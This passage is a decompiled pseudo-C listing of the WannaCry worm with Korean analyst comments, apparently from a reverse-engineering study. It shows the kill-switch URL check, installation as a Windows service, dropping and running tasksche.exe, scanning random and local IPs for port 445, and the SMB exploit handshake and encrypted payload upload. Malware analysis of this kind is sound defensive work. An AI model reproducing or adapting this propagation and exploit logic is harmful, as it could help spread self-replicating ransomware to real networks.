      v15 = v5 + v4;
    }
    if ( a2 )
    {
      v7 = &unk_42E758;
      dword_42ECE9 = v5 + 3440;
      *(&dword_42E750 + v4) = v5;
      *(&dword_42E754 + v4) = 1;
    }
    else
    {
      v7 = &unk_42FA60;
      dword_4302CE = v5 + 3978;
      *(&dword_42FA58 + v4) = v5;
      *(&dword_42FA5C + v4) = 1;
    }
    qmemcpy(v6, v7, v4);
    xorEncryptBuffer_406F00(a3, v6, v15);
    v8 = v15 / 4096;
    v9 = v15 % 4096;
    qmemcpy(buf, &unk_42E710, sizeof(buf));
    v10 = 0;
    v18 = 0;
    if ( v15 / 4096 > 0 )
    {
      for ( i = 0; ; v10 = i )
      {
        v14[0] = v15;
        v14[1] = 4096;
        v14[2] = v10;
        xorEncryptBuffer_406F00(a3, v14, 12);
        v20 = v14[0];
        v21 = v14[1];
        v22 = v14[2];
        qmemcpy(v23, hMem + v10, 0x1000u);
        if ( send(s, buf, 4178, 0) == -1 )
          break;
        if ( recv(s, &v26, 4096, 0) == -1 )
          break;
        if ( v27[33] != 82 )
          break;
        v11 = ++v18 < v8;
        i += 4096;
        if ( !v11 )
          break;
      }
    }
    if ( v9 > 0 )
    {
      *&buf[2] = htons(v9 + 78);
      *&buf[67] = v9 + 13;
      v12 = v8 << 12;
      *&buf[39] = v9;
      *&buf[59] = v9;
      v14[0] = v15;
      v14[1] = v9;
      v14[2] = v12;
      xorEncryptBuffer_406F00(a3, v14, 12);
      v22 = v14[2];
      v20 = v14[0];
      v21 = v14[1];
      qmemcpy(v23, hMem + v12, v9);
      if ( send(s, buf, v9 + 82, 0) != -1 )
        recv(s, &v26, 4096, 0);
    }
    GlobalFree(hMem);
  }
  return 0;
}


// --- Metadata ---
// Function Name: TCPhandshakeSequence_4072A0
// Address: 0x4072A0
// Signature: unknown_signature
// ---------------
int __cdecl TCPhandshakeSequence_4072A0(char *cp, int a2, u_short hostshort)
{
  SOCKET v3; // eax
  SOCKET v4; // esi
  char v5; // bl
  unsigned int v6; // edi
  int v7; // ebx
  int v8; // eax
  char v10; // [esp+Fh] [ebp-419h]
  struct sockaddr name; // [esp+10h] [ebp-418h] BYREF
  int v12; // [esp+24h] [ebp-404h]
  char buf; // [esp+28h] [ebp-400h] BYREF
  char v14[1020]; // [esp+29h] [ebp-3FFh] BYREF
  __int16 v15; // [esp+425h] [ebp-3h]
  char v16; // [esp+427h] [ebp-1h]

  buf = 0;
  name.sa_family = 2;
  memset(v14, 0, sizeof(v14));
  v15 = 0;
  v16 = 0;
  *&name.sa_data[2] = inet_addr(cp);
  *name.sa_data = htons(hostshort);
  v3 = socket(2, 1, 0);
  v4 = v3;
  if ( v3 != -1 )
  {
    if ( connect(v3, &name, 16) != -1
      && send(v4, byte_42E544, 137, 0) != -1
      && recv(v4, &buf, 1024, 0) != -1
      && send(v4, byte_42E5D0, 140, 0) != -1
      && recv(v4, &buf, 1024, 0) != -1 )
    {
      v5 = v14[31];
      byte_42E67C = v14[31];
      v10 = v14[32];
      byte_42E67D = v14[32];
      if ( send(v4, byte_42E65C, 96, 0) != -1 && recv(v4, &buf, 1024, 0) != -1 )
      {
        byte_42E6D8 = v14[27];
        byte_42E6D9 = v14[28];
        byte_42E6DC = v5;
        byte_42E6DD = v10;
        byte_42E72C = v14[27];
        byte_42E72D = v14[28];
        byte_42E730 = v5;
        byte_42E731 = v10;
        if ( send(v4, byte_42E6BC, 82, 0) != -1 && recv(v4, &buf, 1024, 0) != -1 && v14[33] == 81 )
        {
          v6 = *&v14[17];
          v12 = *&v14[21];
          v7 = isSecondParamZero_406EB0(*&v14[17], *&v14[21]);
          v8 = obfuscateSessionId_406ED0(v6);
          sendEncryptedPayload_406F50(v4, v7, v8);
        }
      }
    }
    closesocket(v4);
  }
  return 0;
}


// --- Metadata ---
// Function Name: isPort445Open_407480
// Address: 0x407480
// Signature: unknown_signature
// ---------------
int __cdecl isPort445Open_407480(int a1)
{
  SOCKET v1; // eax
  SOCKET v2; // esi
  int v4; // edi
  struct sockaddr name; // [esp+8h] [ebp-120h] BYREF
  u_long argp; // [esp+18h] [ebp-110h] BYREF
  struct timeval timeout; // [esp+1Ch] [ebp-10Ch] BYREF
  fd_set writefds; // [esp+24h] [ebp-104h] BYREF

  *&name.sa_data[6] = 0;
  *&name.sa_data[8] = 0;
  *&name.sa_data[12] = 0;
  argp = 1;
  *&name.sa_data[2] = a1;
  name.sa_family = 2;
  *name.sa_data = htons(445u);                  // 포트 445 (htons(0x1BD))로 connect() 시도 후 select()로 연결 여부 검사 
  v1 = socket(2, 1, 6);
  v2 = v1;
  if ( v1 == -1 )
    return 0;
  ioctlsocket(v1, -2147195266, &argp);
  writefds.fd_array[0] = v2;
  writefds.fd_count = 1;
  timeout.tv_sec = 1;
  timeout.tv_usec = 0;
  connect(v2, &name, 16);
  v4 = select(0, 0, &writefds, 0, &timeout);
  closesocket(v2);
  return v4;
}


// --- Metadata ---
// Function Name: StartAddress
// Address: 0x407540
// Signature: unknown_signature
// ---------------
unsigned int __stdcall StartAddress(void *in)
{
  char *v1; // eax
  int i; // edi
  char Destination; // [esp+4h] [ebp-104h] BYREF
  char v5[256]; // [esp+5h] [ebp-103h] BYREF
  __int16 v6; // [esp+105h] [ebp-3h]
  char v7; // [esp+107h] [ebp-1h]

  Destination = 0;
  memset(v5, 0, sizeof(v5));
  v6 = 0;
  v7 = 0;
  v1 = inet_ntoa(in);
  strncpy(&Destination, v1, 0x10u);
  if ( smbBruteforce_401980(&Destination, 445u) )// 대상 IP에 대해 SMB 취약점 익스플로잇을 시도하는 스레드 진입점 
  {
    for ( i = 0; i < 5; ++i )                   // 5회 반복 세션 연결 시도 
    {
      Sleep(3000u);
      if ( check_smb_session_response_401B70(&Destination, 1, 445u) )
        break;
      Sleep(3000u);
      manageConnectedClient_401370(&Destination, 445u);
    }
  }
  Sleep(3000u);
  if ( check_smb_session_response_401B70(&Destination, 1, 445u) )
    TCPhandshakeSequence_4072A0(&Destination, 1, 445u);
  endthreadex(0);
  return 0;
}


// --- Metadata ---
// Function Name: initializeCryptoContext_407620
// Address: 0x407620
// Signature: unknown_signature
// ---------------
void initializeCryptoContext_407620()
{
  int i; // esi

  for ( i = 0; i < 2; ++i )
  {
    if ( CryptAcquireContextA(                  // 암호화 컨텍스트 얻기 
           &FileName[272],
           0,
           (i != 0 ? aMicrosoftBaseC : 0),
           1u,
           0xF0000000) )
    {
      break;
    }
  }
  InitializeCriticalSection(&CriticalSection);
}


// --- Metadata ---
// Function Name: genRandomNumForIPAddr_407660
// Address: 0x407660
// Signature: unknown_signature
// ---------------
int __thiscall genRandomNumForIPAddr_407660(void *this)
{
  BYTE pbBuffer[4]; // [esp+0h] [ebp-4h] BYREF

  *pbBuffer = this;
  if ( !*&FileName[272] )
    return rand();
  EnterCriticalSection(&CriticalSection);
  CryptGenRandom(*&FileName[272], 4u, pbBuffer);// 랜덤 숫자를 생성 
  LeaveCriticalSection(&CriticalSection);
  return *pbBuffer;
}


// --- Metadata ---
// Function Name: propagateIfPortOpen_4076B0
// Address: 0x4076B0
// Signature: unknown_signature
// ---------------
unsigned int __stdcall propagateIfPortOpen_4076B0(void *ArgList)
{
  void *v1; // eax
  void *v2; // esi

  if ( isPort445Open_407480(ArgList) > 0 )      // 포트가 열려 있으면 전파 시도
  {
    v1 = beginthreadex(0, 0, StartAddress, ArgList, 0, 0);
    v2 = v1;
    if ( v1 )
    {
      if ( WaitForSingleObject(v1, 0x927C0u) == 258 )
        TerminateThread(v2, 0);
      CloseHandle(v2);
    }
  }
  InterlockedDecrement(&FileName[268]);         // 병렬로 실행되는 웜 전파 쓰레드 수를 추적하는 용도 
  endthreadex(0);
  return 0;
}


// --- Metadata ---
// Function Name: collectIP_spreadWormManager_407720
// Address: 0x407720
// Signature: unknown_signature
// ---------------
unsigned int __stdcall collectIP_spreadWormManager_407720()
{
  unsigned int i; // edi
  void **v1; // eax
  void *v2; // esi
  char v4; // [esp+13h] [ebp-2Dh]
  char v5[4]; // [esp+14h] [ebp-2Ch] BYREF
  void *Block; // [esp+18h] [ebp-28h]
  int v7; // [esp+1Ch] [ebp-24h]
  int v8; // [esp+20h] [ebp-20h]
  char v9[4]; // [esp+24h] [ebp-1Ch] BYREF
  void *v10; // [esp+28h] [ebp-18h]
  int v11; // [esp+2Ch] [ebp-14h]
  int v12; // [esp+30h] [ebp-10h]
  int v13; // [esp+3Ch] [ebp-4h]

  v9[0] = v4;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 1;
  v5[0] = v4;
  Block = 0;
  v7 = 0;
  v8 = 0;
  collectLocalNetworkIPRanges_409160(v9, v5);   // IP 정보 초기화 
  for ( i = 0; ; ++i )
  {
    v1 = v10;
    if ( !v10 || i >= (v11 - v10) >> 2 )
      break;
    if ( *&FileName[268] > 10 )                 // 최대 10개 동시 쓰레드 제한 
    {
      do
        Sleep(0x64u);
      while ( *&FileName[268] > 10 );
      v1 = v10;
    }
    v2 = beginthreadex(0, 0, propagateIfPortOpen_4076B0, v1[i], 0, 0);// 각 항목 별 쓰레드 생성 
    if ( v2 )
    {
      InterlockedIncrement(&FileName[268]);
      CloseHandle(v2);
    }
    Sleep(0x32u);
  }
  endthreadex(0);
  freeBlock_4097FE(Block);
  Block = 0;
  v7 = 0;
  v8 = 0;
  freeBlock_4097FE(v10);
  return 0;
}


// --- Metadata ---
// Function Name: netSpreadRandomIP_407840
// Address: 0x407840
// Signature: unknown_signature
// ---------------
void __stdcall __noreturn netSpreadRandomIP_407840(void *a1)
{
  DWORD (__stdcall *v1)(); // esi
  DWORD v2; // edi
  HANDLE v3; // ebp
  DWORD v4; // ebp
  DWORD v5; // eax
  signed int v6; // ebp
  int v7; // ecx
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // ebx
  unsigned int v11; // eax
  int v12; // eax
  int v13; // edi
  void *v14; // esi
  void *v15; // eax
  void *v16; // esi
  int v17; // [esp+10h] [ebp-118h]
  int v18; // [esp+14h] [ebp-114h]
  unsigned int v19; // [esp+18h] [ebp-110h]
  signed int v20; // [esp+1Ch] [ebp-10Ch]
  DWORD v21; // [esp+1Ch] [ebp-10Ch]
  __time32_t Time; // [esp+20h] [ebp-108h] BYREF
  char Buffer[260]; // [esp+24h] [ebp-104h] BYREF

  v1 = GetTickCount;
  v17 = 1;
  v18 = 1;
  v2 = GetTickCount();
  time(&Time);
  v3 = GetCurrentThread();
  v4 = v3 + GetCurrentThreadId();
  v5 = GetTickCount();
  srand(v4 + Time + v5);
  v6 = v20;
  while ( 1 )                                   // 웜의 핵심 네트워크 전파 스레드 루틴 
  {
    do
    {
      if ( v1() - v2 > 0x249F00 )
        v17 = 1;
      if ( v1() - v2 > 0x124F80 )
        v18 = 1;
      if ( !v17 )
        break;
      if ( a1 >= 32 )
        break;
      v8 = genRandomNumForIPAddr_407660(v7);
      v7 = 255;
      v6 = v8 % 255;
    }
    while ( v8 % 255 == 127 || v6 >= 224 );
    if ( v18 && a1 < 32 )
    {
      v9 = genRandomNumForIPAddr_407660(v7);
      v7 = 255;
      v19 = v9 % 255;
    }
    v10 = genRandomNumForIPAddr_407660(v7) % 255u;
    v11 = genRandomNumForIPAddr_407660(255);
    sprintf(Buffer, "%d.%d.%d.%d", v6, v19, v10, v11 % 0xFF);// 무작위 IP 주소를 생성
    v12 = inet_addr(Buffer);
    if ( isPort445Open_407480(v12) > 0 )        // 해당 IP의 SMB 포트(445번)가 열려 있는지 확인
      break;
LABEL_23:
    Sleep(0x64u);
  }
  v17 = 0;
  v18 = 0;
  v21 = v1();
  v13 = 1;
  while ( 1 )
  {
    sprintf(Buffer, "%d.%d.%d.%d", v6, v19, v10, v13);
    v14 = inet_addr(Buffer);
    if ( isPort445Open_407480(v14) <= 0 )
      goto LABEL_20;
    v15 = beginthreadex(0, 0, StartAddress, v14, 0, 0);
    v16 = v15;
    if ( v15 )
      break;
LABEL_21:
    if ( ++v13 >= 255 )
    {
      v2 = v21;
      v1 = GetTickCount;
      goto LABEL_23;
    }
  }
  if ( WaitForSingleObject(v15, 0x36EE80u) == 258 )
    TerminateThread(v16, 0);
  CloseHandle(v16);
LABEL_20:
  Sleep(0x32u);
  goto LABEL_21;
}


// --- Metadata ---
// Function Name: loadFileToMemory_407A20
// Address: 0x407A20
// Signature: unknown_signature
// ---------------
int loadFileToMemory_407A20()
{
  int result; // eax
  int i; // edx
  const void *v2; // esi
  DWORD *v3; // edi
  HANDLE v4; // eax
  void *v5; // ebx
  DWORD v6; // eax
  DWORD *v7; // esi
  DWORD v8; // edi
  void *v9; // [esp-10h] [ebp-28h]
  DWORD NumberOfBytesRead; // [esp+Ch] [ebp-Ch] BYREF
  DWORD *v11; // [esp+10h] [ebp-8h]
  DWORD *v12; // [esp+14h] [ebp-4h]

  NumberOfBytesRead = 0;
  v11 = 0;
  v12 = 0;
  result = GlobalAlloc(0x40u, &unk_50D800);     // 파일을 메모리에 로딩 
  *&FileName[260] = result;
  if ( result )
  {
    *&FileName[264] = GlobalAlloc(0x40u, &unk_50D800);
    if ( *&FileName[264] )
    {
      for ( i = 0; i < 2; ++i )
      {
        v2 = &unk_40B020;
        if ( i )
          v2 = &unk_40F080;
        v3 = *&FileName[4 * i + 260];
        (&v11)[i] = v3;
        qmemcpy(v3, v2, i != 0 ? 51364 : 16480);
        (&v11)[i] = ((&v11)[i] + (i != 0 ? 51364 : 16480));
      }
      v4 = CreateFileA(FileName, 0x80000000, 1u, 0, 3u, 4u, 0);
      v5 = v4;
      if ( v4 == -1 )
      {
        GlobalFree(*&FileName[260]);
        GlobalFree(*&FileName[264]);
        result = 0;
      }
      else
      {
        v6 = GetFileSize(v4, 0);
        v7 = v11;
        v8 = v6;
        v9 = v11 + 1;
        *v11 = v6;
        ReadFile(v5, v9, v6, &NumberOfBytesRead, 0);
        if ( NumberOfBytesRead == v8 )
        {
          qmemcpy(v12, v7, v8 + 4);
          CloseHandle(v5);
          result = 1;
        }
        else
        {
          CloseHandle(v5);
          GlobalFree(*&FileName[260]);
          GlobalFree(*&FileName[264]);
          result = 0;
        }
      }
    }
    else
    {
      GlobalFree(*&FileName[260]);
      result = 0;
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: setupNetworkCrypto_407B90
// Address: 0x407B90
// Signature: unknown_signature
// ---------------
int setupNetworkCrypto_407B90()
{
  struct WSAData WSAData; // [esp+0h] [ebp-190h] BYREF

  if ( WSAStartup(0x202u, &WSAData) )           // 네트워크 기능 초기화 
    return 0;
  initializeCryptoContext_407620();
  return loadFileToMemory_407A20();
}


// --- Metadata ---
// Function Name: initialize_multithreaded_spread_407BD0
// Address: 0x407BD0
// Signature: unknown_signature
// ---------------
int initialize_multithreaded_spread_407BD0()
{
  int result; // eax
  void *controlThreadHandle; // eax 컨트롤 쓰레드 한 개 
  int threadIndex; // esi
  void *workerThreadHandle; // eax

  result = setupNetworkCrypto_407B90();
  if ( result )
  {
    controlThreadHandle = beginthreadex(0, 0, collectIP_spreadWormManager_407720, 0, 0, 0);
    if ( controlThreadHandle )
      CloseHandle(controlThreadHandle);
    for ( threadIndex = 0; threadIndex < 128; ++threadIndex )// 작업 쓰레드 128개 
    {
      workerThreadHandle = beginthreadex(0, 0, netSpreadRandomIP_407840, threadIndex, 0, 0);
      if ( workerThreadHandle )
        CloseHandle(workerThreadHandle);
      Sleep(0x7D0u);
    }
    result = 0;
  }
  return result;
}


// --- Metadata ---
// Function Name: addServiceSecurity_407C40
// Address: 0x407C40
// Signature: unknown_signature
// ---------------
int addServiceSecurity_407C40()
{
  SC_HANDLE v0; // eax
  SC_HANDLE v1; // edi
  SC_HANDLE v2; // eax
  SC_HANDLE v3; // esi
  char Buffer[260]; // [esp+4h] [ebp-104h] BYREF

  sprintf(Buffer, "%s -m security", FileName);  // 서비스 등록 
  v0 = OpenSCManagerA(0, 0, 0xF003Fu);
  v1 = v0;
  if ( !v0 )
    return 0;
  v2 = CreateServiceA(v0, ServiceName, DisplayName, 0xF01FFu, 0x10u, 2u, 1u, Buffer, 0, 0, 0, 0, 0);
  v3 = v2;
  if ( v2 )
  {
    StartServiceA(v2, 0, 0);
    CloseServiceHandle(v3);
  }
  CloseServiceHandle(v1);
  return 0;
}


// --- Metadata ---
// Function Name: extractResourceAndExecuteTasksche_407CE0
// Address: 0x407CE0
// Signature: unknown_signature
// ---------------
int extractResourceAndExecuteTasksche_407CE0()
{
  HMODULE v0; // eax
  HMODULE v1; // esi
  BOOL (__stdcall *CloseHandle)(HANDLE); // eax
  HRSRC v3; // eax
  HRSRC v4; // esi
  HGLOBAL v5; // eax
  DWORD v6; // ebp
  HANDLE v7; // esi
  LPCVOID lpBuffer; // [esp+5Ch] [ebp-260h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+60h] [ebp-25Ch] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+70h] [ebp-24Ch] BYREF
  char Buffer; // [esp+B4h] [ebp-208h] BYREF
  char v13[256]; // [esp+B5h] [ebp-207h] BYREF
  __int16 v14; // [esp+1B5h] [ebp-107h]
  char v15; // [esp+1B7h] [ebp-105h]
  CHAR NewFileName; // [esp+1B8h] [ebp-104h] BYREF
  char v17[256]; // [esp+1B9h] [ebp-103h] BYREF
  __int16 v18; // [esp+2B9h] [ebp-3h]
  char v19; // [esp+2BBh] [ebp-1h]

  v0 = GetModuleHandleW(&ModuleName);           // 리소스에서 바이너리 데이터를 추출하여 C:\Windows\tasksche.exe에 저장한 뒤 실행
  v1 = v0;
  if ( v0 )
  {
    CreateProcessA = GetProcAddress(v0, ProcName);
    CreateFileA_0 = GetProcAddress(v1, aCreatefilea);
    WriteFile = GetProcAddress(v1, aWritefile);
    CloseHandle = GetProcAddress(v1, aClosehandle);
    dword_43144C = CloseHandle;
    if ( CreateProcessA )
    {
      if ( CreateFileA_0 )
      {
        if ( WriteFile )
        {
          if ( CloseHandle )
          {
            v3 = FindResourceA(0, 0x727, Type);
            v4 = v3;
            if ( v3 )
            {
              v5 = LoadResource(0, v3);
              if ( v5 )
              {
                lpBuffer = LockResource(v5);
                if ( lpBuffer )
                {
                  v6 = SizeofResource(0, v4);
                  if ( v6 )
                  {
                    Buffer = 0;
                    memset(v13, 0, sizeof(v13));
                    v14 = 0;
                    v15 = 0;
                    NewFileName = 0;
                    memset(v17, 0, sizeof(v17));
                    v18 = 0;
                    v19 = 0;
                    sprintf(&Buffer, "C:\\%s\\%s", aWindows, aTaskscheExe);
                    sprintf(&NewFileName, "C:\\%s\\qeriuwjhrf", aWindows);// 기존의 tasksche.exe가 있을 경우 백업처럼 qeriuwjhrf라는 이름으로 이동 
                    MoveFileExA(&Buffer, &NewFileName, 1u);
                    v7 = CreateFileA_0(&Buffer, 0x40000000u, 0, 0, 2u, 4u, 0);
                    if ( v7 != -1 )
                    {
                      WriteFile(v7, lpBuffer, v6, &lpBuffer, 0);
                      dword_43144C(v7);
                      ProcessInformation.hThread = 0;
                      ProcessInformation.dwProcessId = 0;
                      ProcessInformation.dwThreadId = 0;
                      memset(&StartupInfo.lpReserved, 0, 0x40u);
                      ProcessInformation.hProcess = 0;
                      strcat(&Buffer, &off_431340);
                      StartupInfo.cb = 68;
                      StartupInfo.wShowWindow = 0;
                      StartupInfo.dwFlags = 129;
                      if ( CreateProcessA(0, &Buffer, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
                      {
                        dword_43144C(ProcessInformation.hThread);
                        dword_43144C(ProcessInformation.hProcess);
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return 0;
}


// --- Metadata ---
// Function Name: excuteTaskscheAndaddService_407F20
// Address: 0x407F20
// Signature: unknown_signature
// ---------------
int excuteTaskscheAndaddService_407F20()
{
  addServiceSecurity_407C40();
  extractResourceAndExecuteTasksche_407CE0();
  return 0;
}


// --- Metadata ---
// Function Name: HandlerProc
// Address: 0x407F30
// Signature: unknown_signature
// ---------------
void __stdcall HandlerProc(DWORD dwControl)
{
  switch ( dwControl )
  {
    case 1u:
    case 5u:
      ServiceStatus.dwCurrentState = 1;
      ServiceStatus.dwWin32ExitCode = 0;
      ServiceStatus.dwCheckPoint = 0;
      ServiceStatus.dwWaitHint = 0;
      break;
    case 2u:
      ServiceStatus.dwCurrentState = 7;
      break;
    case 3u:
      ServiceStatus.dwCurrentState = 4;
      break;
    default:
      break;
  }
  SetServiceStatus(hServiceStatus, &ServiceStatus);
}


// --- Metadata ---
// Function Name: ChangeServiceConfig_407FA0
// Address: 0x407FA0
// Signature: unknown_signature
// ---------------
BOOL __cdecl ChangeServiceConfig_407FA0(SC_HANDLE hService, int a2)
{
  int v3[2]; // [esp+0h] [ebp-1Ch] BYREF
  int Info[5]; // [esp+8h] [ebp-14h] BYREF

  v3[0] = 1;
  Info[0] = 0;
  v3[1] = 1000 * a2;
  Info[3] = a2 != -1;
  Info[2] = &unk_70F87C;
  Info[1] = &unk_70F87C;
  Info[4] = v3;
  return ChangeServiceConfig2A(hService, 2u, Info);
}


// --- Metadata ---
// Function Name: serviceMainWithWormPropagation_408000
// Address: 0x408000
// Signature: unknown_signature
// ---------------
SERVICE_STATUS_HANDLE __stdcall serviceMainWithWormPropagation_408000(int a1, int a2)
{
  SERVICE_STATUS_HANDLE result; // eax

  ServiceStatus.dwServiceType = 32;
  ServiceStatus.dwCurrentState = 2;
  ServiceStatus.dwControlsAccepted = 1;
  ServiceStatus.dwWin32ExitCode = 0;
  ServiceStatus.dwServiceSpecificExitCode = 0;
  ServiceStatus.dwCheckPoint = 0;
  ServiceStatus.dwWaitHint = 0;
  result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);// 윈도우 서비스 형태로 실행되기 위해 
  hServiceStatus = result;
  if ( result )
  {
    ServiceStatus.dwCurrentState = 4;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(result, &ServiceStatus);
    initialize_multithreaded_spread_407BD0();   // 워너크라이의 웜 동작 핵심인 다중 스레드를 통한 확산 초기화 
    Sleep(86400000u);                           // 실행 후, 약 24시간 대기 후 프로세스 종료  
    ExitProcess(1u);
  }
  return result;
}


// --- Metadata ---
// Function Name: StartServiceDispatcher_408090
// Address: 0x408090
// Signature: unknown_signature
// ---------------
int StartServiceDispatcher_408090()
{
  SC_HANDLE v1; // eax
  SC_HANDLE v2; // edi
  SC_HANDLE v3; // eax
  SC_HANDLE v4; // esi
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+8h] [ebp-8h]
  int v7; // [esp+Ch] [ebp-4h]

  GetModuleFileNameA(0, FileName, 0x104u);
  if ( *_p___argc() < 2 )
    return excuteTaskscheAndaddService_407F20();// 서비스로 실행된 경우: 메인 서비스 시작 
  v1 = OpenSCManagerA(0, 0, 0xF003Fu);          // 일반 실행된 경우: 작업 스케줄러 등록 
  v2 = v1;
  if ( v1 )
  {
    v3 = OpenServiceA(v1, ServiceName, 0xF01FFu);
    v4 = v3;
    if ( v3 )
    {
      ChangeServiceConfig_407FA0(v3, 60);       //     기존 서비스가 있으면 ChangeServiceConfig()로 설정 변경 
      CloseServiceHandle(v4);
    }
    CloseServiceHandle(v2);
  }
  ServiceStartTable.lpServiceName = ServiceName;
  ServiceStartTable.lpServiceProc = serviceMainWithWormPropagation_408000;
  v6 = 0;
  v7 = 0;
  return StartServiceCtrlDispatcherA(&ServiceStartTable);// StartServiceCtrlDispatcher()로 서비스 실행 제어 시작 
}


// --- Metadata ---
// Function Name: _WinMain@16
// Address: 0x408140
// Signature: unknown_signature
// ---------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  void *v4; // esi
  void *v5; // edi
  CHAR szUrl[57]; // [esp+8h] [ebp-50h] BYREF
  int v8; // [esp+41h] [ebp-17h]
  int v9; // [esp+45h] [ebp-13h]
  int v10; // [esp+49h] [ebp-Fh]
  int v11; // [esp+4Dh] [ebp-Bh]
  int v12; // [esp+51h] [ebp-7h]
  __int16 v13; // [esp+55h] [ebp-3h]
  char v14; // [esp+57h] [ebp-1h]

  strcpy(szUrl, "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com");// 킬 스위치  
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v4 = InternetOpenA(0, 1u, 0, 0, 0);
  v5 = InternetOpenUrlA(v4, szUrl, 0, 0, 0x84000000, 0);
  InternetCloseHandle(v4);
  if ( v5 )
  {
    InternetCloseHandle(v5);
  }
  else
  {
    InternetCloseHandle(0);
    StartServiceDispatcher_408090();
  }
  return 0;
}


// --- Metadata ---
// Function Name: sub_408200
// Address: 0x408200
// Signature: unknown_signature
// ---------------
_BYTE *__thiscall sub_408200(_BYTE *this, _BYTE *a2, _BYTE *a3)
{
  _DWORD *v4; // edi
  void *v5; // ebp
  int v6; // edi
  _DWORD *v7; // eax

  *this = *a3;
  this[1] = *a2;
  this[8] = 0;
  v4 = operator new(0x18u);
  v5 = v4;
  v4[1] = 0;
  v4[5] = 1;
  std::_Lockit::_Lockit(&a3);
  if ( !*&FileName[280] )
  {
    *&FileName[280] = v4;
    *v4 = 0;
    v5 = 0;
    *(*&FileName[280] + 8) = 0;
  }
  ++*&FileName[276];
  std::_Lockit::~_Lockit(&a3);
  if ( v5 )
    freeBlock_4097FE(v5);
  v6 = *&FileName[280];
  v7 = operator new(0x18u);
  v7[1] = v6;
  v7[5] = 0;
  *(this + 1) = v7;
  *(this + 3) = 0;
  *v7 = v7;
  *(*(this + 1) + 8) = *(this + 1);
  return this;
}


// --- Metadata ---
// Function Name: sub_4082B0
// Address: 0x4082B0
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall sub_4082B0(_DWORD **this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = *this[1];
  return result;
}


// --- Metadata ---
// Function Name: rbTreeDeleteRange
// Address: 0x4082C0
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall rbTreeDeleteRange(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *v4; // ebp
  _DWORD *v5; // esi
  _DWORD *v7; // eax
  void **v8; // ebx
  int v9; // eax
  void **j; // esi
  _DWORD *v11; // eax
  _DWORD *result; // eax
  _DWORD *v13; // ebx
  _DWORD *i; // eax

  v4 = a4;
  v5 = a3;
  if ( !this[3] || (v7 = this[1], a3 != *v7) || a4 != v7 )// 레드블랙트리의 특정 구간 노드 삭제 
  {
    if ( a3 == a4 )
    {
LABEL_15:
      result = a2;
      *a2 = v5;
      return result;
    }
    while ( 1 )
    {
      v13 = v5;
      if ( v5[2] == *&FileName[280] )
      {
        for ( i = v5[1]; v5 == i[2]; i = i[1] )
          v5 = i;
        if ( v5[2] == i )
          goto LABEL_14;
      }
      else
      {
        i = findMinNode_408D30(v5[2]);
      }
      v5 = i;
LABEL_14:
      rbTreeDelete_4085D0(this, &a4, v13);
      if ( v5 == v4 )
        goto LABEL_15;
    }
  }
  v8 = v7[1];
  v9 = *&FileName[280];
  for ( j = v8; j != *&FileName[280]; v8 = j )
  {
    freeRedBlackTree_4089D0(j[2]);
    j = *j;
    freeBlock_4097FE(v8);
    v9 = *&FileName[280];
  }
  *(this[1] + 4) = v9;
  v11 = this[1];
  this[3] = 0;
  *v11 = v11;
  *(this[1] + 8) = this[1];
  result = a2;
  *a2 = *this[1];
  return result;
}


// --- Metadata ---
// Function Name: rbInsertOrFind_408390
// Address: 0x408390
// Signature: unknown_signature
// ---------------
int __thiscall rbInsertOrFind_408390(int this, int a2, _DWORD *a3)
{
  _DWORD *v4; // ebx
  bool v5; // al
  _DWORD *v6; // ecx
  _DWORD *v7; // esi
  _DWORD *v8; // ebp
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // ebp
  int v12; // eax
  _DWORD *v13; // ecx
  _DWORD *v14; // eax
  _DWORD *v15; // esi
  _DWORD *v16; // eax
  _DWORD *v17; // edx
  _DWORD *v18; // ecx
  int v19; // ecx
  int result; // eax
  int v21; // edx
  int v22; // edx
  int v23; // edx
  _DWORD *v24; // [esp+10h] [ebp-4h] BYREF

  v4 = a3;
  v5 = 1;
  v6 = *(this + 4);
  v7 = v6;
  v8 = v6[1];
  while ( v8 != *&FileName[280] )
  {
    v7 = v8;
    v5 = *a3 < v8[3];
    if ( *a3 >= v8[3] )
      v8 = v8[2];
    else
      v8 = *v8;
  }
  if ( *(this + 8) )
  {
    v9 = createRbNode_408DB0(v7, 0);
    a3 = v9;
    *v9 = *&FileName[280];
    v9[2] = *&FileName[280];
    copyNodeData_408E30(v9 + 3, v4);
    v10 = *(this + 4);
    ++*(this + 12);
    if ( v7 == v10 || v8 != *&FileName[280] || *v4 < v7[3] )
    {
      v13 = a3;
      *v7 = a3;
      v14 = *(this + 4);
      if ( v7 == v14 )
      {
        v14[1] = v13;
        *(*(this + 4) + 8) = v13;
      }
      else if ( v7 == *v14 )
      {
        *v14 = a3;
      }
      v11 = a3;
    }
    else
    {
      v11 = a3;
      v7[2] = a3;
      v12 = *(this + 4);
      if ( v7 == *(v12 + 8) )
        *(v12 + 8) = v11;
    }
    v15 = v11;
    while ( v15 != *(*(this + 4) + 4) )
    {
      v16 = v15[1];
      if ( v16[5] )
        break;
      v17 = v16[1];
      v18 = *v17;
      if ( v16 == *v17 )
      {
        v19 = v17[2];
        if ( *(v19 + 20) )
        {
          if ( v15 == v16[2] )
          {
            v15 = v15[1];
            RBrotateLeft_408CD0(this, v16);
          }
          *(v15[1] + 20) = 1;
